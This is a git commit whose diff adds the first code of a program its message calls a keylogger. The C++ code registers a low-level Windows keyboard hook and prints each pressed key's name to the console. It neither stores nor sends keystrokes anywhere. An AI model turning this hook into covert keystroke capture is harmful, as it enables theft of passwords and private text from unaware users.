35f53e30b368368e11b8aa40c2c62bdd4e2e0b5a
osamu-kj <kevin.jerebica@gmail.com>
2022-12-04 19:16:56 +0000

    General: Add initial code for the keylogger program
    On start the program will register a keyboard hook and listen for
    WM_KEYDOWN events, fetch the virtual key and show it to the console.

--- Pivoter.cpp
+++ Pivoter.cpp
@@ -5,7 +5,32 @@
 */
 
 #include <iostream>
+#include <string.h>
+#include <Windows.h>
+#include <WinUser.h>
+#include "codes.h"
 
-int main()
-{
+HHOOK keyboard_events_hook; 
+
+LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
+	if (wParam == WM_KEYDOWN) {
+		KBDLLHOOKSTRUCT* kbd_struct = (KBDLLHOOKSTRUCT*)lParam; 
+		DWORD virt_code = kbd_struct->vkCode; 
+
+		std::string string_key_code = VIRTUAL_KEY_CODE_TABLE[virt_code].name; 
+		std::cout << "[!!] Key pressed: " << string_key_code << std::endl; 
+	}
+	return CallNextHookEx(keyboard_events_hook, nCode, wParam, lParam);
+}
+
+int main() {
+	
+	keyboard_events_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_callback, 0, 0); 
+ 
+	// EVENT LOOP
+	while (GetMessage(NULL, NULL, 0, 0)); 
+
+	UnhookWindowsHookEx(keyboard_events_hook);
+
+	return 0; 
 }
